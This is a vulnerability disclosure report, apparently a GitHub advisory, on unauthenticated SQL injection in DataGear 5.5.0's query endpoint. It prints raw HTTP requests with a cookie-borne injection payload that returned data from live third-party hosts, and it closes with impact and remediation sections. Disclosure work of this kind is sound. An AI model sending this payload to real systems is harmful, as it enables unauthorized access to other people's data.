# Datavul-sql

**1.Title**
Unauthenticated SQL Injection Leading to Privilege Escalation in DataGear Authentication API

**2. Overview**
A critical SQL injection vulnerability exists in the authentication API endpoint of DataGear. This allows unauthenticated remote attackers to bypass login checks, escalate privileges to administrator level, and execute arbitrary SQL statements, leading to full compromise of the application and its underlying database.

**3. Affected Versions**
Confirmed Affected Version: 5.5.0
Note: The full range of affected versions is currently unknown. This vulnerability has been confirmed to exist in version 5.50, and other versions may also be affected.

**4. Technical Details**
Vulnerability Type: SQL Injection (CWE-89)
Attack Vector: Remote, Unauthenticated
Root Cause: The authentication endpoint does not properly sanitize user-supplied input before constructing SQL queries, allowing an attacker to inject malicious SQL payloads.
Exploit Example: 
#### Step 1: Verify Unauthenticated Access Restriction
To confirm the access control mechanism, an unauthenticated request was sent to a protected query endpoint. The server returned a **Permission denied** response, indicating that administrator privileges are required to access this endpoint. This is demonstrated in the attached screenshot, which shows the raw HTTP request and the `Permission denied` response.
<img width="1413" height="583" alt="189b25a4-daf6-4904-954d-f95cbf8f2ad6" src="https://github.com/user-attachments/assets/680c0539-a121-4a58-9c8b-594e10ca539e" />

#### Step 2: Exploit SQL Injection to Bypass Authentication
<img width="1414" height="638" alt="fa31b721-5103-42b3-a471-095483260f2b" src="https://github.com/user-attachments/assets/8c49fe08-8232-47de-aa2c-9a0bd8e235d1" />
<img width="1394" height="631" alt="6304fe79-76f2-48c2-b1cd-644d5f00e909" src="https://github.com/user-attachments/assets/91b76d47-bc20-4daf-a07a-a4b3c1ae8831" />

#### Step 3: Reproduction on Domains with "da" Prefix
The vulnerability was further verified on multiple target domains with prefix **"da"**.
When sending unauthenticated requests to the protected query endpoints of these domains **without SQL injection payloads**, no data was returned.
<img width="1386" height="614" alt="450e77a8-7503-45d5-8866-863db02fe17c" src="https://github.com/user-attachments/assets/5ed252e6-6389-411e-b608-a7bedbfe93af" />

By sending the same malicious SQL injection payload to these endpoints, the authentication check was successfully bypassed. The server returned valid administrator-level sensitive data, which was not accessible in the unexploited state.
<img width="1398" height="644" alt="96c0bdcc-333c-4588-831a-e2e7ff712532" src="https://github.com/user-attachments/assets/9e807ea7-9648-4dce-8099-cefa06bd881f" />

#### Step 4: Verify Boolean-Based Blind SQL Injection
<img width="1406" height="635" alt="96e9dc16-c12a-421a-b8d5-db8e180d1a40" src="https://github.com/user-attachments/assets/a5ba7283-9cb0-4d47-b0c9-952dc09ea67e" />

The attached screenshot demonstrates the use of a SQL statement to determine whether the number of records in the `DATAGEAR_SCHEMA` table is greater than 1. This confirms the presence of boolean-based blind SQL injection, where the application's response changes based on the truthfulness of the injected SQL condition, even without direct data exfiltration.
<img width="1393" height="634" alt="9840a904-6d27-4f2a-bf13-a12fc45fe83f" src="https://github.com/user-attachments/assets/250c6bac-5d7b-45bf-8797-3454b2311902" />

**Asset Ownership Verification**
To confirm the legitimacy of the tested target asset, a screenshot of the target website's homepage is attached as supplementary evidence. This screenshot clearly displays the following key information for asset verification:

The target domain name (consistent with the domain used in vulnerability reproduction), and verification via the browser's developer tools (F12) shows that the icons on the page point to the official website, further validating the asset's attribution
<img width="1919" height="969" alt="0ad4a2ba-b8cf-405b-9f31-b48a380f77b0" src="https://github.com/user-attachments/assets/23c3dec6-e5fd-44a3-a4cf-07b37f2762bc" />
<img width="1919" height="966" alt="7c90070b-f076-490f-be51-a2ae258d598d" src="https://github.com/user-attachments/assets/ac42bebf-e260-431b-b51d-7c5757106235" />

The official homepage content of the asset
<img width="1919" height="1019" alt="56debe7c-e438-4035-b4d1-aeb3ce845774" src="https://github.com/user-attachments/assets/a36cb9f9-c2d4-417a-843a-f7866c556972" />

In addition, redacted (data-desensitized) HTTP request and response packets from the vulnerability exploitation process are attached. Sensitive information (e.g., full IP addresses, personal identifiable information, internal domain names) has been masked to comply with data security regulations while retaining the core proof of vulnerability exploitation.
<img width="1386" height="633" alt="image" src="https://github.com/user-attachments/assets/9f48e90b-8ca0-432f-9632-fa12a70b8ae2" />
**Request1**
POST /data/d5e2bca9b18278ac3514/cms_category/queryData HTTP/1.1
Host: 3x.xx.xxx.xxx:50401
Content-Length: 110
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Cookie: USER_ID_ANONYMOUS=2e69de3d6b994d51bffa0499894ea3ed; DETECTED_VERSION=5.5.0; PAGINATION_PAGE_SIZE=10; ANALYSIS_PROJECT_ID=; THEME=light; MAIN_NAV_ACTIVE_TAB_INDEX=0; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=E2DD52AD1A4AAA836E1B37F0CC2D4BD4
Connection: keep-alive

{"orders":[{"name":"id","type":"asc"}],"keyword":"","notLike":"false","condition":"","page":1,"pageSize":"10"}

**Response1**
HTTP/1.1 400 
Set-Cookie: JSESSIONID=CF9D9EF07222B472357CBAACA6D1B510; Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/json;charset=UTF-8
Content-Language: en-US
Date: Sat, 17 Jan 2026 12:17:03 GMT
Connection: close
Content-Length: 148

{"type":"FAIL","code":"error.PermissionDeniedException","message":"Permission denied","throwableDetail":false,"data":[],"success":false,"fail":true}

<img width="1400" height="671" alt="3be7d753-1f7c-490b-800d-da615c8f8da6" src="https://github.com/user-attachments/assets/961ce9dc-8280-4454-aa06-2d8dc9c4480d" />

**Request2**
POST /data/d5e2bca9b18278ac3514/cms_category/queryData HTTP/1.1
Host: 39.xx.xxx.xx:50401
Content-Length: 110
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Cookie: USER_ID_ANONYMOUS=2e69de3d6b994d51bffa0499894ea3ed'/**/OR/**/'1'='1; DETECTED_VERSION=5.5.0; PAGINATION_PAGE_SIZE=10; ANALYSIS_PROJECT_ID=; THEME=light; MAIN_NAV_ACTIVE_TAB_INDEX=0; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=E2DD52AD1A4AAA836E1B37F0CC2D4BD4
Connection: keep-alive

{"orders":[{"name":"id","type":"asc"}],"keyword":"","notLike":"false","condition":"","page":1,"pageSize":"10"}

**Response2** Sensitive data has been removed due to its volume.

HTTP/1.1 200 
Set-Cookie: JSESSIONID=940B7841E132416AA13B4E5A5C309194; Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/json;charset=UTF-8
Content-Length: 6066
Date: Sat, 17 Jan 2026 12:20:38 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"total":46,"items":[{"category_flag":"nav","category_list_url":"","category_url":"","top_id":"0","category_type":"3","del":0,"leaf":0,"category_pinyin":"bggk","category_diy_url":"/bggk/benguangaikuang/index.html","category_sort":1,"category_img":"mdiy_model_id":25,"category_keyword":"","id":"1521767434966347778","category_parent_ids":"1521767433544478722","update_by":"57","create_date":"2020-11-19 10:58:41.0"}],"pages":5,"endIndex":10,"page":1,"startRow":1,"startIndex":0,"pageSize":10,"endRow":11}


**5. Impact Analysis**
Privilege Escalation: Successfully bypassed authentication to gain administrator-level access via SQL injection, confirmed through reproduction.
Data Exfiltration: The vulnerability allows unauthorized reading of sensitive enterprise data from the database, including user credentials, personal information, and internal business records.
Data Manipulation: Potential to modify or delete database records (not fully verified in this reproduction, but inherent risk of SQL injection).
Code Execution: Not observed or confirmed in this test; further exploitation may be required to assess this risk.
<img width="1393" height="634" alt="9840a904-6d27-4f2a-bf13-a12fc45fe83f" src="https://github.com/user-attachments/assets/229aee91-d5be-47ac-a5ab-4801a916caca" />

**6. Remediation**
Immediate Fix: Implement parameterized queries (prepared statements) in the authentication API to prevent SQL injection.
Long-term Mitigation: Conduct regular security audits of all API endpoints, implement a Web Application Firewall (WAF), and follow secure coding practices.
